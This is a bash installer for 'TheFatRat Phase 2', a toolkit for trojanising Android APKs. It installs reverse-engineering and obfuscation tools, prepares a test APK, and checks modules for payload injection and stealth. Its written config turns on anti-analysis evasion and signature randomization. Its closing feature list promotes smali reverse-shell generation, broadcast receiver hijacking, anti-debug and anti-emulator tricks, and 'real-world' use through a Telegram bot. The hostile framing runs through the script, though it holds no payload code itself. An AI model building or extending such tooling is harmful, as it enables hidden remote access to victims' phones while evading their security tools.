#!/bin/bash

# TheFatRat Phase 2 Setup Script
# Advanced APK Modification Engine

echo "🚀 Setting up TheFatRat Phase 2 - Advanced APK Modification Engine"
echo "=================================================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[⚠]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_info() {
    echo -e "${BLUE}[ℹ]${NC} $1"
}

# Check if running as root
if [[ $EUID -eq 0 ]]; then
    print_error "This script should not be run as root for security reasons"
    exit 1
fi

# Check if Phase 1 is installed
if [ ! -f "/workspace/setup_phase1.sh" ] || [ ! -d "/workspace/uploads" ]; then
    print_error "Phase 1 must be installed first. Run setup_phase1.sh"
    exit 1
fi

print_info "Phase 1 detected. Proceeding with Phase 2 installation..."

# Update system packages
print_info "Updating system packages for Phase 2..."
sudo apt-get update -qq

# Install additional dependencies for advanced features
print_info "Installing advanced dependencies..."
sudo apt-get install -y \
    aapt \
    android-tools-adb \
    android-tools-fastboot \
    zipalign \
    apksigner \
    jadx \
    dex2jar \
    gcc-arm-linux-gnueabihf \
    gcc-aarch64-linux-gnu \
    gcc-multilib \
    binutils-arm-linux-gnueabihf \
    binutils-aarch64-linux-gnu \
    file \
    hexdump \
    xxd \
    radare2

# Install Python packages for advanced analysis
print_info "Installing Python packages for advanced analysis..."
pip3 install \
    python-magic \
    androguard \
    capstone \
    keystone-engine \
    unicorn \
    pycrypto \
    cryptography \
    lief \
    r2pipe

# Download and setup Android SDK if not present
print_info "Setting up Android SDK tools..."
ANDROID_SDK_DIR="/workspace/tools/android-sdk"
mkdir -p "$ANDROID_SDK_DIR"

if [ ! -d "$ANDROID_SDK_DIR/build-tools" ]; then
    print_info "Downloading Android SDK Build Tools..."
    cd /tmp
    wget -q https://dl.google.com/android/repository/build-tools_r30.0.3-linux.zip
    unzip -q build-tools_r30.0.3-linux.zip -d "$ANDROID_SDK_DIR/"
    mv "$ANDROID_SDK_DIR/android-11" "$ANDROID_SDK_DIR/build-tools/latest"
    rm build-tools_r30.0.3-linux.zip
fi

# Setup apktool if not present
print_info "Setting up apktool..."
APKTOOL_DIR="/workspace/tools/apktool"
mkdir -p "$APKTOOL_DIR"

if [ ! -f "$APKTOOL_DIR/apktool.jar" ]; then
    print_info "Downloading apktool..."
    cd "$APKTOOL_DIR"
    wget -q https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
    wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.7.0.jar -O apktool.jar
    chmod +x apktool
    chmod +x apktool.jar
fi

# Setup Android String Obfuscator
print_info "Setting up Android String Obfuscator..."
ASO_DIR="/workspace/tools/android-string-obfuscator"
if [ ! -d "$ASO_DIR" ]; then
    print_info "Cloning Android String Obfuscator..."
    git clone https://github.com/FireCubeStudios/android-string-obfuscator.git "$ASO_DIR"
    cd "$ASO_DIR"
    npm install 2>/dev/null || print_warning "Node.js not available, string obfuscator may not work"
fi

# Create test APK for validation
print_info "Creating test APK for validation..."
TEST_APK_DIR="/workspace/test_apks"
mkdir -p "$TEST_APK_DIR"

# Download a simple test APK if available
if [ ! -f "$TEST_APK_DIR/test.apk" ]; then
    print_info "Creating test APK..."
    # Use existing APK from APKS directory or create a minimal one
    if [ -f "/workspace/APKS/armeabi-v7a/AdobeReader.apk" ]; then
        cp "/workspace/APKS/armeabi-v7a/AdobeReader.apk" "$TEST_APK_DIR/test.apk"
    else
        # Create minimal APK structure for testing
        TEST_BUILD_DIR="$TEST_APK_DIR/build"
        mkdir -p "$TEST_BUILD_DIR"
        
        # Create minimal AndroidManifest.xml
        cat > "$TEST_BUILD_DIR/AndroidManifest.xml" << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.test.app"
    android:versionCode="1"
    android:versionName="1.0">
    
    <uses-permission android:name="android.permission.INTERNET" />
    
    <application android:label="Test App">
        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF
        
        # Create minimal smali directory structure
        mkdir -p "$TEST_BUILD_DIR/smali/com/test/app"
        
        cat > "$TEST_BUILD_DIR/smali/com/test/app/MainActivity.smali" << 'EOF'
.class public Lcom/test/app/MainActivity;
.super Landroid/app/Activity;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    return-void
.end method
EOF
        
        # Build test APK using apktool
        cd "$TEST_BUILD_DIR"
        java -jar "$APKTOOL_DIR/apktool.jar" b . -o "$TEST_APK_DIR/test.apk" 2>/dev/null || print_warning "Test APK creation failed"
        rm -rf "$TEST_BUILD_DIR"
    fi
fi

# Test Phase 2 components
print_info "Testing Phase 2 components..."

# Test APK analysis engine
cd /workspace/orchestrator
if python3 -c "
import sys
sys.path.append('/workspace/orchestrator')
from apk_analysis_engine import APKAnalysisEngine
from pathlib import Path
if Path('/workspace/test_apks/test.apk').exists():
    engine = APKAnalysisEngine(Path('/workspace'))
    result = engine.comprehensive_analysis(Path('/workspace/test_apks/test.apk'))
    print('APK Analysis Engine: ✓ Working')
else:
    print('APK Analysis Engine: ⚠ No test APK available')
" 2>/dev/null; then
    print_status "APK Analysis Engine working correctly"
else
    print_warning "APK Analysis Engine test failed"
fi

# Test payload injection system
if python3 -c "
import sys
sys.path.append('/workspace/orchestrator')
from payload_injection_system import MultiVectorInjector
from pathlib import Path
injector = MultiVectorInjector(Path('/workspace'))
print('Payload Injection System: ✓ Working')
" 2>/dev/null; then
    print_status "Payload Injection System working correctly"
else
    print_warning "Payload Injection System test failed"
fi

# Test stealth mechanisms
if python3 -c "
import sys
sys.path.append('/workspace/orchestrator')
from stealth_mechanisms import StealthMechanismEngine
from pathlib import Path
stealth = StealthMechanismEngine(Path('/workspace'))
print('Stealth Mechanism Engine: ✓ Working')
" 2>/dev/null; then
    print_status "Stealth Mechanism Engine working correctly"
else
    print_warning "Stealth Mechanism Engine test failed"
fi

# Create advanced configuration
print_info "Creating advanced configuration..."
cat > /workspace/.env.phase2 << 'EOF'
# Phase 2 Advanced Configuration

# Analysis Engine Settings
ENABLE_DEEP_ANALYSIS=true
ANALYSIS_TIMEOUT=300
MAX_ANALYSIS_MEMORY=512

# Injection Engine Settings
DEFAULT_INJECTION_VECTORS=3
ENABLE_NATIVE_INJECTION=true
ENABLE_MULTI_ARCH_SUPPORT=true

# Stealth Engine Settings
DEFAULT_STEALTH_LEVEL=high
ENABLE_RUNTIME_EVASION=true
ENABLE_STATIC_EVASION=true
ENABLE_BEHAVIORAL_CAMOUFLAGE=true
ENABLE_SIGNATURE_RANDOMIZATION=true

# Performance Settings
MAX_CONCURRENT_MODIFICATIONS=2
MODIFICATION_TIMEOUT=1800
CLEANUP_TEMP_FILES=true

# Security Settings
VERIFY_APK_SIGNATURES=true
LOG_ALL_MODIFICATIONS=true
ENABLE_AUDIT_TRAIL=true
EOF

# Create Phase 2 status check script
print_info "Creating Phase 2 status check script..."
cat > /workspace/check_phase2.sh << 'EOF'
#!/bin/bash
echo "TheFatRat Phase 2 Status Check"
echo "=============================="

echo -e "\n🔧 Advanced Analysis Engine:"
python3 -c "
import sys
sys.path.append('/workspace/orchestrator')
try:
    from apk_analysis_engine import APKAnalysisEngine
    print('  ✓ APK Analysis Engine: Available')
    print('  ✓ Manifest Parser: Available')  
    print('  ✓ Permission Analyzer: Available')
    print('  ✓ Code Structure Scanner: Available')
    print('  ✓ Anti-Analysis Detector: Available')
except Exception as e:
    print(f'  ✗ Analysis Engine Error: {e}')
"

echo -e "\n🎯 Payload Injection System:"
python3 -c "
import sys
sys.path.append('/workspace/orchestrator')
try:
    from payload_injection_system import MultiVectorInjector
    print('  ✓ Multi-Vector Injector: Available')
    print('  ✓ Smali Code Generator: Available')
    print('  ✓ Native Library Generator: Available')
except Exception as e:
    print(f'  ✗ Injection System Error: {e}')
"

echo -e "\n🥷 Stealth Mechanisms:"
python3 -c "
import sys
sys.path.append('/workspace/orchestrator')
try:
    from stealth_mechanisms import StealthMechanismEngine
    print('  ✓ Runtime Evasion: Available')
    print('  ✓ Static Analysis Evasion: Available')
    print('  ✓ Behavioral Camouflage: Available')
    print('  ✓ Signature Randomization: Available')
except Exception as e:
    print(f'  ✗ Stealth Mechanisms Error: {e}')
"

echo -e "\n🛠️ Tool Availability:"
[ -f "/workspace/tools/apktool/apktool.jar" ] && echo "  ✓ APKTool: Available" || echo "  ✗ APKTool: Missing"
[ -d "/workspace/tools/android-sdk/build-tools" ] && echo "  ✓ Android SDK: Available" || echo "  ✗ Android SDK: Missing"
[ -d "/workspace/tools/android-string-obfuscator" ] && echo "  ✓ String Obfuscator: Available" || echo "  ✗ String Obfuscator: Missing"

echo -e "\n📊 Database Integration:"
cd /workspace/orchestrator
python3 -c "
try:
    from database import db_manager
    stats = db_manager.get_statistics()
    print(f'  ✓ Database: Connected')
    print(f'  ✓ Total Files: {stats[\"files\"][\"total\"]}')
    print(f'  ✓ Total Tasks: {stats[\"tasks\"][\"total\"]}')
except Exception as e:
    print(f'  ✗ Database Error: {e}')
"

echo -e "\n🌐 API Status:"
curl -s http://127.0.0.1:8000/health 2>/dev/null && echo "  ✓ API: Online" || echo "  ✗ API: Offline"

echo -e "\n📱 Test APK:"
[ -f "/workspace/test_apks/test.apk" ] && echo "  ✓ Test APK: Available" || echo "  ✗ Test APK: Missing"

EOF

chmod +x /workspace/check_phase2.sh

# Create Phase 2 demo script
print_info "Creating Phase 2 demonstration script..."
cat > /workspace/demo_phase2.sh << 'EOF'
#!/bin/bash
echo "TheFatRat Phase 2 Demonstration"
echo "==============================="

if [ ! -f "/workspace/test_apks/test.apk" ]; then
    echo "❌ No test APK available for demonstration"
    exit 1
fi

echo "🔍 Running comprehensive APK analysis..."
cd /workspace/orchestrator
python3 -c "
import sys, json
sys.path.append('/workspace/orchestrator')
from apk_analysis_engine import APKAnalysisEngine
from pathlib import Path

engine = APKAnalysisEngine(Path('/workspace'))
result = engine.comprehensive_analysis(Path('/workspace/test_apks/test.apk'))

print(f'📱 Package: {result[\"manifest_analysis\"].get(\"package_name\", \"Unknown\")}')
print(f'🔒 Risk Level: {result[\"risk_assessment\"].get(\"risk_level\", \"Unknown\")}')
print(f'🛡️ Protection Score: {result[\"security_analysis\"].get(\"overall_protection_score\", 0)}')
print(f'📊 Total Classes: {result[\"code_structure\"].get(\"total_classes\", 0)}')
print(f'🎯 Injection Difficulty: {result[\"risk_assessment\"].get(\"injection_difficulty\", \"Unknown\")}')

recommendations = result[\"injection_recommendations\"]
print(f'💡 Recommended Injection Points: {len(recommendations[\"recommended_injection_points\"])}')
print(f'🥷 Evasion Techniques Needed: {len(recommendations[\"evasion_techniques_needed\"])}')
"

echo -e "\n✅ Phase 2 demonstration completed!"
echo "For full APK modification, use the Telegram bot with '📱 تعديل APK مرسل' option"
EOF

chmod +x /workspace/demo_phase2.sh

# Update main startup script to include Phase 2
print_info "Updating startup scripts for Phase 2..."
if [ -f "/workspace/start_services.sh" ]; then
    # Add Phase 2 initialization to startup
    if ! grep -q "Phase 2" /workspace/start_services.sh; then
        cat >> /workspace/start_services.sh << 'EOF'

echo "Initializing Phase 2 advanced components..."

# Source Phase 2 environment
if [ -f "/workspace/.env.phase2" ]; then
    source /workspace/.env.phase2
    echo "Phase 2 configuration loaded"
fi

# Validate Phase 2 components
if /workspace/check_phase2.sh | grep -q "✗"; then
    echo "⚠️ Some Phase 2 components may not be fully functional"
else
    echo "✅ All Phase 2 components operational"
fi
EOF
    fi
fi

print_status "Phase 2 installation completed successfully!"
echo ""
print_info "Phase 2 Features Installed:"
echo "✅ Advanced APK Analysis Engine"
echo "   - Manifest Parser with binary XML support"
echo "   - Permission Analyzer with risk assessment"
echo "   - Code Structure Scanner with obfuscation detection"
echo "   - Anti-Analysis Detector for protection mechanisms"
echo ""
echo "✅ Multi-Vector Payload Injection System"
echo "   - Smali Code Generator for reverse shells"
echo "   - Native Library Integration (C/JNI)"
echo "   - Service Background Integration"
echo "   - Broadcast Receiver Hijacking"
echo ""
echo "✅ Advanced Stealth Mechanisms"
echo "   - Runtime Evasion (anti-debug, anti-emulator, anti-hook)"
echo "   - Static Analysis Evasion (string obfuscation, dead code)"
echo "   - Behavioral Camouflage (legitimate activity simulation)"
echo "   - Signature Randomization (structure modification)"
echo ""
print_info "Next steps:"
echo "1. Check Phase 2 status: /workspace/check_phase2.sh"
echo "2. Run demonstration: /workspace/demo_phase2.sh"
echo "3. Test via Telegram bot: '📱 تعديل APK مرسل'"
echo "4. Monitor logs: tail -f /workspace/logs/*.log"
echo ""
print_warning "Phase 2 provides advanced APK modification capabilities."
print_warning "Use responsibly and in compliance with applicable laws."
echo ""
echo "🎯 Ready for real-world APK modification with advanced evasion!"